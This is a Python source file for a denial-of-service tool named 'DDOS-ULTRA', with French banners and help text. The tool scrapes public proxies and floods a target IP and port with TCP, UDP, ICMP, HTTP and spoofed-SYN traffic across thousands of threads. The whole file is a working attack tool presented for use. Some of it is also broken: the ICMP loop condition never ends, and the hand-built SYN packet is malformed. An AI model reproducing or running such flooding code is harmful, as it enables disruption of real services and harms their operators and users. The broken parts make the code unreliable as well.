import socket
import threading
import random
import time
import requests
import os
from concurrent.futures import ThreadPoolExecutor
from faker import Faker
import argparse

fake = Faker()
LOCK = threading.Lock()
ATTACK_COUNT = 0

def get_proxies():
    try:
        url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        proxies = requests.get(url, timeout=10).text.splitlines()
        return [p.strip() for p in proxies if p.strip()]
    except:
        return [""]  
PROXIES = get_proxies()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
    # +300 user agents
] + [fake.user_agent() for _ in range(300)]

PAYLOADS = [
    b"\x00" * 1024 * 1024,  # 1MB
    b"GET / HTTP/1.1\r\nHost: null\r\n\r\n" * 1000,
    os.urandom(65535),
]

def tcp_flood(target_ip, target_port, duration):
    global ATTACK_COUNT
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            while time.time() < end_time:
                s.sendall(random.choice(PAYLOADS))
                with LOCK:
                    ATTACK_COUNT += 1
        except:
            pass
        finally:
            try: s.close()
            except: pass

def udp_flood(target_ip, target_port, duration):
    global ATTACK_COUNT
    end_time = time.time() + duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        try:
            s.sendto(random.choice(PAYLOADS), (target_ip, target_port))
            with LOCK:
                ATTACK_COUNT += 1
        except:
            pass
    s.close()

def icmp_flood(target_ip, duration):
    global ATTACK_COUNT
    if os.name == "nt":
        while time.time() < time.time() + duration:
            os.system(f"ping -n 1 -l 65500 {target_ip} >nul")
    else:
        while time.time() < time.time() + duration:
            os.system(f"ping -c 1 -s 65500 {target_ip} >/dev/null 2>&1")

def http_flood(url, duration):
    global ATTACK_COUNT
    end_time = time.time() + duration
    session = requests.Session()
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
    }
    while time.time() < end_time:
        try:
            proxy = random.choice(PROXIES) if PROXIES else None
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
            session.get(url, headers=headers, proxies=proxies, timeout=5)
            with LOCK:
                ATTACK_COUNT += 1
        except:
            pass

def spoofed_syn_flood(target_ip, target_port, duration):
    global ATTACK_COUNT
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            source_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            source_port = random.randint(1024, 65535)
            packet = socket.inet_aton(source_ip) + socket.inet_aton(target_ip)
            packet += bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
            packet += bytes([0x50, 0x02, 0x00, 0x00])  # SYN flag
            s.sendto(packet, (target_ip, target_port))
            with LOCK:
                ATTACK_COUNT += 1
        except PermissionError:
            print("[!] SPOOF nécessite les privilèges root/admin")
            break
        except:
            pass

def attack_worker(target_ip, target_port, protocol, duration):
    threads = []
    if protocol in ["tcp", "all"]:
        for _ in range(500):
            t = threading.Thread(target=tcp_flood, args=(target_ip, target_port, duration))
            threads.append(t)
    if protocol in ["udp", "all"]:
        for _ in range(600):
            t = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
            threads.append(t)
    if protocol in ["icmp", "all"]:
        t = threading.Thread(target=icmp_flood, args=(target_ip, duration))
        threads.append(t)
    if protocol in ["http", "all"]:
        url = f"http://{target_ip}:{target_port}"
        for _ in range(400):
            t = threading.Thread(target=http_flood, args=(url, duration))
            threads.append(t)
    if protocol in ["syn", "all"]:
        for _ in range(300):
            t = threading.Thread(target=spoofed_syn_flood, args=(target_ip, target_port, duration))
            threads.append(t)

    for t in threads:
        t.start()
    for t in threads:
        t.join()

def main():
    parser = argparse.ArgumentParser(description="DDOS-ULTRA by loulou from IDS")
    parser.add_argument("ip", help="IP cible")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port (défaut: 80)")
    parser.add_argument("-t", "--time", type=int, default=300, help="Durée en secondes (défaut: 300)")
    parser.add_argument("--protocol", choices=["tcp","udp","http","icmp","syn","all"], default="all")
    parser.add_argument("--threads", type=int, default=2000, help="Max threads")
    args = parser.parse_args()

    print(f"""
    ╔══════════════════════════════════════════╗
    ║           DDOS-ULTRA v9.11               ║
    ║           Fais par privatly              ║
    ╚══════════════════════════════════════════╝
    CIBLE      : {args.ip}:{args.port}
    PROTOCOLE  : {args.protocol.upper()}
    DURÉE      : {args.time}s
    THREADS    : {args.threads}
    """)
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for _ in range(10):  # 10 vagues
            executor.submit(attack_worker, args.ip, args.port, args.protocol, args.time)

    print(f"[+] Attaque terminée - {ATTACK_COUNT:,} paquets envoyés en {int(time.time()-start_time)}s")

if __name__ == "__main__":
    try:
        os.system("title DDOS-ULTRA-UHQ by privatly from smop" if os.name == "nt" else "")
        main()
    except KeyboardInterrupt:
        print("\n[!] Arrêt forcé par l'utilisateur")
    except Exception as e:
        print(f"[ERREUR] {e}")
